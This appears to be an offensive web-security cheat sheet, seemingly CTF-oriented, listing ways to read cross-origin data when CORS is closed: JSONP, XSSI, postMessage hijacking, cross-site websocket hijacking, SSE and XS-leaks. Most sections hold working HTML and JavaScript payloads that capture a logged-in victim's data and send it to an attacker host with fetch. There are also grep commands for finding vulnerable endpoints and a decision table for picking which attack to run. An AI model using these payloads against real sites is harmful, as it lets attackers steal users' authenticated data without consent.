# Alternate reads — the non-CORS channels that serve the data

When CORS is closed, the data may still be readable through a
script-tag, a postMessage, or a websocket — the alternate-read
corpus.

---

## 1. JSONP — the script-tag read

```bash
# is the endpoint JSONP? — the callback param wraps the JSON
curl -s -b "$CJ" "$BASE/api/me?callback=x" | head -1
#   x({"name":"y","flag":"..."}) → a JS-servable endpoint
```

```html
<script src="https://t/api/me?callback=leak"></script>
<script>function leak(d){fetch('https://a/?d='+JSON.stringify(d))}</script>
```

A JSONP endpoint serves the data AS JavaScript — readable via
`<script src>` with no CORS check. the tag's cookies ride (SameSite-
gated).

## 2. XSSI — a JS-served endpoint that isn't JSONP

```text
an endpoint serving sensitive data AS executable JS — a var-assign,
a global-set — readable via <script src> without a callback. the
page overrides the global setter to capture it.
```

```html
<script>
// the endpoint sets a global — capture it before it loads
var captured;
Object.defineProperty(window,'SECRET',{set:function(v){captured=v}});
</script>
<script src="https://t/api/x.js"></script>
<script>fetch('https://a/?d='+captured)</script>
```

## 3. postMessage-hijack — a page that broadcasts

```html
<iframe src="https://t/page"></iframe>
<script>
window.addEventListener('message',e=>{
  // the target postMessages the data to '*' or an unverified origin
  fetch('https://a/?d='+JSON.stringify(e.data));
});
</script>
```

A target page that postMessages sensitive data to `'*'` — your
iframe receives it.

## 4. websocket — a ws channel with cookie auth

```js
var w=new WebSocket('wss://t/ws');
// the handshake carries cookies cross-site — a CSWSH read+write
w.onmessage=e=>fetch('https://a/?d='+e.data);
```

A ws endpoint with cookie-auth and no Origin check — the channel
carries the data without CORS.

## 5. SSE — a server-sent event stream

```js
var s=new EventSource('https://t/events');
// SSE is CORS-gated like fetch — but a misconfigured endpoint reads
s.onmessage=e=>fetch('https://a/?d='+e.data);
```

## 6. The `<img>`/`<script>`/`<link>` loads — a subresource read

```html
<!-- a subresource tag sends cookies cross-site (SameSite-gated) -->
<img src="https://t/api/avatar.png">
<!-- the IMAGE loads — the DATA doesn't reach JS, but the load
     itself may leak via size/error/timing — an XS-leak, not a CORS read -->
```

## 7. The iframe-read — a same-origin frame

```html
<iframe src="https://t/api/me"></iframe>
<!-- a same-origin iframe read needs the target's own origin —
     an XSS on the target, not a CORS read -->
```

## 8. The DNS-prefetch/resource-hint side-channel

```html
<link rel="dns-prefetch" href="https://t.evil.com">
<!-- a DNS resolution leaks the fetch attempt — a tiny XS-leak -->
```

## 9. The alternate-read routing table

```text
a JSONP endpoint           → a <script src> read — no CORS
a JS-served endpoint       → XSSI — a <script src> read
a postMessage-broadcast    → an iframe+listener — no CORS
a ws/wss endpoint          → a websocket read — no CORS
an SSE endpoint            → an EventSource read — CORS-gated like fetch
a subresource tag          → an XS-leak — a side-channel, not a read
an iframe                  → a same-origin read — needs target XSS
```

## 10. The white-box alternate-read grep

```bash
# the JSONP/JS-serving endpoints
grep -rnoiE 'callback|jsonp|application/javascript|text/javascript|res\.send.*\+|content-type.*javascript' <src> | head -20
# the postMessage broadcasts
grep -rnoE 'postMessage\(' <src> | head -10
# the ws endpoints
grep -rnoE 'ws://|wss://|new WebSocket|websocket|socket\.io' <src> | head -10
```

## 11. The alternate-read decision — which channel when CORS is closed

```text
CORS closed + a JSONP endpoint     → the JSONP script-tag read
CORS closed + a JS-served endpoint → the XSSI script-tag read
CORS closed + a postMessage page   → the postMessage-hijack
CORS closed + a ws endpoint        → the websocket read
CORS closed + a measurable diff    → an XS-leak (a side-channel, not a read)
CORS closed + no alternate         → a different bug class
```
